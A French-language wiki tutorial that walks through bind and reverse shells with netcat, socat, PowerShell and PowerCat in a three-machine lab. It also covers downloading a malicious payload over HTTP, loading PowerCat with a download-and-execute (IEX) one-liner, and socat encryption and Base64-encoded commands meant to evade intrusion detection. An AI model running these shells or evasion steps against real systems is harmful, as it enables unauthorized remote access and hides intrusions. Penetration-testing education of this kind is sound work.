---
title: Connexion - Reverse - Transfert
description: Les principaux outils pour une connexion à distance réussie !
published: true
date: 2020-09-30T00:30:22.762Z
tags: 
editor: undefined
dateCreated: 2020-01-15T20:11:02.729Z
---

![schéma_wiki_réseau.jpg](/schéma_wiki_réseau.jpg){.align-center}

Pour nos exemples, nous utiliserons 3 machines avec les configurations suivantes :

> 1. **Kali Linux** 2020.3 - *10.10.10.20/24* - Monsieur Capuche.

> 2. **Ubuntu** 20.04 - *10.10.10.10/24* - Madame Alice.

> 3. **Windows Serveur** 2016 - *10.10.10.30/24* Monsieur Bob. 

# NetCat

> **NetCat** est un utilitaire réseau capable de lire et écrire des données sur les réseaux en ligne de commande. Il utilise à la fois TCP et UDP pour la communication et est conçu pour être un outil fiable pour fournir instantanément une connectivité réseau à d'autres applications et utilisateurs. **NetCat** fonctionnera non seulement avec IPv4 et IPv6 et fournit à l'utilisateur un nombre pratiquement illimité d'utilisations potentielles.
{.is-info}

## CONNEXION ET ÉCOUTE

> Il est possible, comme dans une connexion classique, d'ouvrir un port d'écoute en attente de connexion. Celle-ci reste ouverte jusqu'à fermeture et est décorellée de la couche applicative. Il est alors possible de s'appuyer sur cette connexion pour effectuer toutes sortes d'activités.
{.is-info}


Dans notre exemple, **Capuche** se connectera à **Alice**.

Création d'un serveur d'écoute : `nc -nvlp [Port]`

![ehx5h2fxxm.gif](/uploads/reconnaissance/ehx5h2fxxm.gif){.align-center}

Connexion au serveur distant : `nc -nv [@IP] [Port]`

![6pcynfcqu4.gif](/uploads/reconnaissance/6pcynfcqu4.gif){.align-center}

L'entrée standard du client est alors bind avec la sortie standard du serveur. Dans notre cas, un message "*coucou*" du client est alors visible chez le serveur.

![vmware_8ecmfbapms.png](/uploads/reconnaissance/vmware_8ecmfbapms.png){.align-center}

> Remarque : La connexion est réalisée en clair, elle peut être détectée et interceptée.
{.is-warning}


## BIND SHELL

Dans notre premier cas, **Bob** mettra en place en serveur d'écoute bind à une instance *CMD.exe* et **Capuche** s'y connectera.

Mise en place du serveur bind : `nc -nvlp [port] -e [executable]`

![ygkm7dxofh.gif](/uploads/reconnaissance/ygkm7dxofh.gif){.align-center}

Connexion de Capuche sur Bob : `nc -nv [@IP] [Port]`

![wm6psjsldp.gif](/uploads/reconnaissance/wm6psjsldp.gif){.align-center}

## REVERSE SHELL

Dans notre second cas **Bob** mettra en place un serveur d'écoute et **Capuche** s'y connectera en bindant son Shell.

Mise en place du serveur d'écoute : `nc -nvlp [Port]`

![yenm4invbt.gif](/uploads/reconnaissance/yenm4invbt.gif){.align-center}

Connexion de **Capuche** sur **Bob** avec un bind Shell : `nc -nv [@IP] [Port] [Executable]`

![3o2r8zswkt.gif](/uploads/reconnaissance/3o2r8zswkt.gif){.align-center}

**Bob** a maintenant un terminal à distance sur le poste de **Capuche**.

![lveigrylii.gif](/uploads/reconnaissance/lveigrylii.gif){.align-center}

# SoCat

> **Socat** est un utilitaire en ligne de commande qui établit deux flux bidirectionnels et transfère les données entre eux. C'est donc comme NetCat mais avec le transfert de données. Les flux peuvent être construits à partir d'un grand ensemble de puits de données et de sources. Socat peut être utilisé à de nombreuses fins différentes.
{.is-info}

## CONNEXION

Dans notre cas, **Capuche** se connectera à **Alice**.

Mise en place du serveur d'écoute : `socat TCP4-LISTEN:[Port] STDOUT`

![6cgkaqzs1l.gif](/uploads/reconnaissance/6cgkaqzs1l.gif){.align-center}

Connexion de **Capuche** : `socat - TCP4:[@IP]:[Port]`

![mdgggtwlvk.gif](/uploads/reconnaissance/mdgggtwlvk.gif){.align-center}

**Alice** reçoit bien la connexion de **Capuche** :

![vmware_awvnvg2clb.png](/uploads/reconnaissance/vmware_awvnvg2clb.png){.align-center}

## TRANSFERT DE FICHIER

Dans notre cas, **Capuche** crée un serveur d'écoute avec un trigger pour lancer le téléchargement d'un fichier payload à la connexion d'**Alice**.

Création du serveur d'écoute et du trigger : `socat TCP4-LISTEN:[Port],fork file:[Fichier]`

![tdfxqlbdcp.gif](/uploads/reconnaissance/tdfxqlbdcp.gif){.align-center}

Connexion est download d'Alice : `socat TCP4:[@IP]:[Port] file:[Fichier],create`

![kmzv5kgwcx.gif](/uploads/reconnaissance/kmzv5kgwcx.gif){.align-center}

## REVERSE SHELL

**Alice** crée un serveur d'écoute et **Capuche** s'y connecte en bindant un Shell.

Création du serveur d'écoute : `socat -d -d TCP4-LISTEN:[Port] STDOUT`

![43mvrsnavh.gif](/uploads/reconnaissance/43mvrsnavh.gif){.align-center}

Connexion : `socat TCP4:[@IP]:[Port] EXEC:[Executable]`
**Alice** peut maintenant exécuter des commandes sur le poste de **Capuche**.

![j8vfp1styk.gif](/uploads/reconnaissance/j8vfp1styk.gif){.align-center}

## REVERSE SHELL CHIFFRÉ
> Pour éviter la détection de fuite d'information par un réseau cible, il est possible de chiffrer ses communications pour utiliser un shell sécurisé.
{.is-success}

> **Remarque** : Une exfiltration trop importante sur une durée réduite peut avoir l'effet inverse et déclencher les sondes d'un NIDS (*Network Intrusion Detection System*).
{.is-warning}


> OpenSSL est une boîte à outils de chiffrement comportant deux bibliothèques, libcrypto et libssl, fournissant respectivement une implémentation des algorithmes cryptographiques et du protocole de communication SSL/TLS, ainsi qu'une interface en ligne de commande, openssl. 
> *Source : https://fr.wikipedia.org/wiki/OpenSSL*
{.is-info}

Dans notre exemple, **Alice** génère un certificat x.509 autosigné utilisant un couple clé privée / clé publique sous le modèle SSL PKI. 

*Si vous avez l'impression de voir flou et de lire de l'hébreu, pas de panique, une section cryptographie est là pour vous aider.*

Petit rappel :

![ssl-certificates-700x642.png](/uploads/reconnaissance/ssl-certificates-700x642.png){.align-center}

Création du certificat par **Alice** avec une clé de 2048 bits: 

`openssl req -newkey rsa:[Longueur_Clé] -nodes -keyout [Nom_Clé_Privée].key -x509 -days 362 -out [Nom_Certificat].crt`

Il faudra renseigner les champs pour la génération du certificat, certains champs peuvent rester vides :

![pybq65kyvg.gif](/uploads/reconnaissance/pybq65kyvg.gif){.align-center}

![vmware_hj8x5czlfl.png](/uploads/reconnaissance/vmware_hj8x5czlfl.png){.align-center}

![vmware_xojfq8vw8u.png](/uploads/reconnaissance/vmware_xojfq8vw8u.png){.align-center}

> **Attention** : Le système SSL repose sur un principe de sécurité primordial : **LA CLÉ PRIVÉE NE DOIT JAMAIS ÊTRE DÉVOILÉE/PUBLIÉE/PARTAGÉE AVEC QUICONQUE !**
{.is-danger}

Pour fonctionner en mode chiffré, **Socat** accepte uniquement un fichier de certificat encodé .pem contenant **le certificat ET la clé privée**. 

Alice va donc créer ce fichier .pem : 

`cat [Nom_Clé_Privée].key [Nom_Certificat].crt > [Nom_Certificat_Encodé].pem`

![vmware_5fmvaadbd5.png](/uploads/reconnaissance/vmware_5fmvaadbd5.png){.align-center}
![vmware_safpmbjju1.png](/uploads/reconnaissance/vmware_safpmbjju1.png){.align-center}

**Alice** peut maintenant créer un serveur d'écoute chiffré lié à son certificat et bind à un terminal :

`sudo socat OPENSSL-LISTEN:[Port],cert=[Nom_Certificat_Encodé].pem,verify=0,fork EXEC:[Executable]`

![vu20lujh7q.gif](/uploads/reconnaissance/vu20lujh7q.gif){.align-center}

**Monsieur Capuche** peut maintenant se connecter et envoyer des commandes sur le poste d'**Alice** en toute sécurité et sans alerter la terre entière de ses actions : `socat - OPENSSL:[@IP]:[Port],verify=0`

![i9hhefqbfc.gif](/uploads/reconnaissance/i9hhefqbfc.gif){.align-center}

# PowerShell
![1_lcbttbsawmaago0jnvl9ug.jpeg](/uploads/reconnaissance/1_lcbttbsawmaago0jnvl9ug.jpeg){.align-center}
> **Windows PowerShell**, anciennement Microsoft Command Shell (*MSH*), nom de code Monad, est une suite logicielle développée par Microsoft qui intègre une interface en ligne de commande, un langage de script nommé **PowerShell** ainsi qu'un kit de développement.
> Source : https://fr.wikipedia.org/wiki/Windows_PowerShell
{.is-info}

## INITIALISATION
> Pour des raisons de sécurité, PowerShell  bloque par défaut les scripts et certains paramètres de configuration.
{.is-warning}

> **Attention** : La levée des restrictions d'exécution des scipts PowerShell est facilement détectable par un HIDS (*Host-based Intrusion Detection System*).
{.is-danger}


Pour désactiver les protections, lancez PowerShell en **Administrateur** : 

`Set-ExecutionPolicy Unrestricted`

![firefox_qlyjpj1tzt.png](/uploads/reconnaissance/firefox_qlyjpj1tzt.png){.align-center}
![powershell_ise_eo7tp1km3y.png](/uploads/reconnaissance/powershell_ise_eo7tp1km3y.png){.align-center}
![powershell_ise_k4ttmknh58.png](/uploads/reconnaissance/powershell_ise_k4ttmknh58.png){.align-center}

Vous pouvez vérifier les paramètres avec : `Get-ExecutionPolicy`

![vmware_wuhw5zpsvm.png](/uploads/reconnaissance/vmware_wuhw5zpsvm.png){.align-center}

## TRANSFERT DE FICHIER

Il est possible de transférer des données via HTTP en utilisant PowerShell. Il est ainsi possible de transférer un payload malveillant comme une simple connexion internet.

Dans notre exemple, **Monsieur Capuche** va mettre à disposition un fichier malveillant sur son serveur web que **Monsieur Bob** pourra télécharger.

> Attention : Le protocol HTTP n'est pas sécurisé et toute donnée l'utilisant transite en clair. Dans le cas du transfert d'un Payload, un firewall avec un système de "Deep Packet Inspection" remarquera très vite la supercherie.
{.is-danger}

Monsieur Capuche place un payload dans le répertoire par défaut de son serveur web :

`sudo cp /home/noone/Documents/Virus.exe /var/www/html/`

![vmware_gslvgaftjp.png](/uploads/reconnaissance/vmware_gslvgaftjp.png){.align-center}

Puis il lance son serveur web : `sudo systemctl start apache2`

Il est possible de vérifier le status d'un service avec : `systemctl status [service]`.

![vmware_wqi6kwvziw.png](/uploads/reconnaissance/vmware_wqi6kwvziw.png){.align-center}

**Bob** peut maintenant télécharger le fichier malveillant depuis une invite de commande CMD : 

`powershell -c (“new-object System.Net.WebClient).DownloadFile(‘http://[@IP]/[Executable]’,’[Chemin de sauvegarde]\[Executable]’)”`

![autqxju4wa.gif](/uploads/reconnaissance/autqxju4wa.gif){.align-center}

![vmware_cujtrc6gnh.png](/uploads/reconnaissance/vmware_cujtrc6gnh.png){.align-center}

## REVERSE SHELL

Dans notre cas, **Monsieur Capuche** va créer un serveur d'écoute auquel **Monsieur Bob** va se connecter tout en y connectant son invite PowerShell.

Création serveur d'écoute : `nc -nvlp [Port]`

![vmware_jc9gsm1jhd.png](/uploads/reconnaissance/vmware_jc9gsm1jhd.png){.align-center}

Monsieur Bob peut maintenant s'y connecter via PowerShell : 

![code_wxo9ylmdob.png](/uploads/reconnaissance/code_wxo9ylmdob.png)

Lien vers le script : [reverse_shell_powershell.ps1](/uploads/reconnaissance/reverse_shell_powershell.ps1)

![putuhprtpa.gif](/uploads/reconnaissance/putuhprtpa.gif){.align-center}

**Monsieur Capuche** dispose désormais d'un accès à une instance PowerShell sur le poste de **Monsieur Bob** :

![vmware_3elhudzoif.png](/uploads/reconnaissance/vmware_3elhudzoif.png){.align-center}
![vmware_hfeutgibnj.png](/uploads/reconnaissance/vmware_hfeutgibnj.png){.align-center}

## BIND SHELL

Dans notre cas, c'est **Monsieur Bob** qui créera le serveur d'écoute et liera son instance PowerShell. **Monsieur Capuche** s'y connectera à distance.

Création du serveur d'écoute avec liaison PowerShell : 

![code_kt93gezr8t.png](/uploads/reconnaissance/code_kt93gezr8t.png){.align-center}

Lien vers le script : [bind_shell_powershell.ps1](/uploads/reconnaissance/bind_shell_powershell.ps1)

![bwxeef6cs7.gif](/uploads/reconnaissance/bwxeef6cs7.gif){.align-center}

Monsieur Capuche n'a plus qu'à s'y connecter : `nc -nv [@IP] [Port]`

![mzkhgzlpce.gif](/uploads/reconnaissance/mzkhgzlpce.gif){.align-center}

# PowerCat

> PowerCat est l'adaptation de NetCat pour PowerShell. C'est un outil libre et puissant facilitant l'utilisation de PowerShell pour les cas qui nous intéressent.
> 
> Cet outil est réalisé par [besimorhino](https://github.com/besimorhino/powercat)
{.is-info}

Pour pouvoir utiliser PowerCat, il faut charger les fonctions dans l'instance PowerShell en cours. 

Vous pouvez télécharger le script et le charger manuellement depuis le dépôt github de son créateur ou directement via cette commande : 

`IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
`

![vmware_hnwipqbt91.png](/uploads/reconnaissance/vmware_hnwipqbt91.png){.align-center}

> **Remarque** : Le chargement du script et de son contenu n'est valable que pour l'instance en cours. Il faudra donc renouveler l'opération à chaque nouvelle instance. 
{.is-warning}

## REVERSE SHELL

**Monsieur Capuche** réalisera un serveur d'écoute auquel **Monsieur Bob** va se connecter en lui donnant accès à une invite de commande CMD. 

Création serveur d'écoute : `nc -nvlp [Port]`

![vmware_ojswpqmidv.png](/uploads/reconnaissance/vmware_ojswpqmidv.png){.align-center}

Bob peut maintenant s'y connecter : `powercat -c [@IP] -p [Port] -e [Executable]`

![vmware_vdgarfk2k1.png](/uploads/reconnaissance/vmware_vdgarfk2k1.png){.align-center}

**Monsieur Capuche** peut maintenant exécuter des commandes sur le poste de **Monsieur Bob**.

![vmware_20uzbjqvae.png](/uploads/reconnaissance/vmware_20uzbjqvae.png){.align-center}

## BIND SHELL

**Monsieur Bob** crée maintenant un serveur d'écoute avec une invite CMD en trigger :

`powercat -l -p [Port] -e [Executable]`

![vmware_zpxwnd43ug.png](/uploads/reconnaissance/vmware_zpxwnd43ug.png){.align-center}
**Monsieur Capuche** peut maintenant s'y connecter et avoir accès au poste de **Monsieur Bob** :

`nc -nv [@IP] [Port]`

![edcipjyufy.gif](/uploads/reconnaissance/edcipjyufy.gif){.align-center}

## SÉCURISATION

> **Attention** : Au-delà de l'autorisation d'exécution des scripts PowerShell pouvant être détectée par un HIDS (*Host-based Intrusion Detection System*), l'utilisation d'outils comme PowerShell ou PowerCat en clair restent détectables. Leurs signatures sont bien connues des NIDS (*Network Intrusion Detection System*).
{.is-danger}

> Il est donc recommendé d'encoder vos commandes avec PowerShell avant de les utiliser.
{.is-success}

**Monsieur Bob** va encoder en **Base64** une instruction de connexion avec un bind vers une invite de commande. L'instruction sera alors interprétée par **PowerShell** mais sera beaucoup plus difficile à détecter.

Encodage de la commande dans un fichier .ps1 :

`powercat -c [@IP] -p [Port] -e [Executable] -ge > [Nom_Fichier_Encodé].ps1`

![vmware_4oehya4eka.png](/uploads/reconnaissance/vmware_4oehya4eka.png){.align-center}

Le fichier ***encodedreverseshell.ps1*** contient maintenant nos instructions obfusquées :

![firefox_vcqck8sayb.png](/uploads/reconnaissance/firefox_vcqck8sayb.png){.align-center}

Si on reverse l'encodage, on obtient bien nos instructions plus quelques fioritures :

![firefox_mcr6h5hg3n.png](/uploads/reconnaissance/firefox_mcr6h5hg3n.png){.align-center}

Pour lancer notre commande encodée, il suffit de la copier et de la coller après l'instruction suivante : `powershell.exe -E`

![vmware_rnhxsqzbyq.png](/uploads/reconnaissance/vmware_rnhxsqzbyq.png){.align-center}
